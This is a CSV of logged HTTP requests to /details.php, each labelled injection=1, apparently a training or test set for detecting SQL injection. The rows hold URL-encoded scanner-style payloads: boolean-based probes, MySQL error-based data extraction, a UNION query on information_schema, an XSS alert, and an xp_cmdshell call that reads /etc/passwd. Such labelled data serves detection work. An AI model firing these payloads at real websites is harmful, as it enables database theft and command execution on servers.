full_url,event_time,hostname,injection
/details.php?prod=5&type=%3F,1681395103.391033,192.168.43.6,1
/details.php?prod=5&type=%3F&GIuz=7549%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,1681395105.638078,192.168.43.6,1
/details.php?prod=5&type=%3F,1681395105.675592,192.168.43.6,1
/details.php?prod=7831&type=%3F,1681395105.752823,192.168.43.6,1
/details.php?prod=5%22%27%2C.%28%28%28%2C%2C%2C&type=%3F,1681395105.82879,192.168.43.6,1
/details.php?prod=5%27TZjPyH%3C%27%22%3EmqKgLf&type=%3F,1681395105.87042,192.168.43.6,1
/details.php?prod=5%29%20AND%204971%3D8255--%20JLuW&type=%3F,1681395107.341763,192.168.43.6,1
/details.php?prod=5%29%20AND%201516%3D1516--%20XjAT&type=%3F,1681395107.361725,192.168.43.6,1
/details.php?prod=5%29%20AND%202418%3D3915%20AND%20%283630%3D3630&type=%3F,1681395107.385171,192.168.43.6,1
/details.php?prod=5%29%20AND%201516%3D1516%20AND%20%281869%3D1869&type=%3F,1681395107.453848,192.168.43.6,1
/details.php?prod=5%29%29%20AND%205944%3D2832%20AND%20%28%281521%3D1521&type=%3F,1681395107.502595,192.168.43.6,1
/details.php?prod=5%29%29%20AND%201516%3D1516%20AND%20%28%284333%3D4333&type=%3F,1681395107.518198,192.168.43.6,1
/details.php?prod=5%29%29%29%20AND%205683%3D6090%20AND%20%28%28%287709%3D7709&type=%3F,1681395107.570911,192.168.43.6,1
/details.php?prod=5%29%29%29%20AND%201516%3D1516%20AND%20%28%28%281796%3D1796&type=%3F,1681395107.633097,192.168.43.6,1
/details.php?prod=5%20AND%201177%3D7460&type=%3F,1681395107.63796,192.168.43.6,1
/details.php?prod=5%20AND%201516%3D1516&type=%3F,1681395107.642136,192.168.43.6,1
/details.php?prod=5%20AND%206092%3D5434&type=%3F,1681395107.646205,192.168.43.6,1
/details.php?prod=%28SELECT%20CONCAT%28CONCAT%280x71717a6271%2C%28CASE%20WHEN%20%287022%3D7022%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x717a626271%29%29&type=%3F,1681395107.705676,192.168.43.6,1
/details.php?prod=5%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%287448%3D7448%2C1%29%29%29%2C0x717a626271%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=%3F,1681395107.711663,192.168.43.6,1
/details.php?prod=5%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%285487%3D5487%2C1%29%29%29%2C0x717a626271%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=%3F,1681395107.720045,192.168.43.6,1
/details.php?prod=5%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%282131%3D2131%2C1%29%29%29%2C0x717a626271%2C0x78%29%29x%29%29&type=%3F,1681395107.736773,192.168.43.6,1
/details.php?prod=5%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%284924%3D4924%2C1%29%29%29%2C0x717a626271%2C0x78%29%29x%29%29&type=%3F,1681395107.7715,192.168.43.6,1
/details.php?prod=5%20AND%20GTID_SUBSET%28CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%282364%3D2364%2C1%29%29%29%2C0x717a626271%29%2C2364%29&type=%3F,1681395107.77752,192.168.43.6,1
/details.php?prod=5%20OR%20GTID_SUBSET%28CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%283235%3D3235%2C1%29%29%29%2C0x717a626271%29%2C3235%29&type=%3F,1681395107.860414,192.168.43.6,1
/details.php?prod=5%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%289548%3D9548%2C1%29%29%29%2C0x717a626271%29%29%20USING%20utf8%29%29%29&type=%3F,1681395107.865954,192.168.43.6,1
/details.php?prod=5%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x71717a6271%2C%28SELECT%20%28ELT%281079%3D1079%2C1%29%29%29%2C0x717a626271%29%29%20USING%20utf8%29%29%29&type=%3F,1681395107.915821,192.168.43.6,1
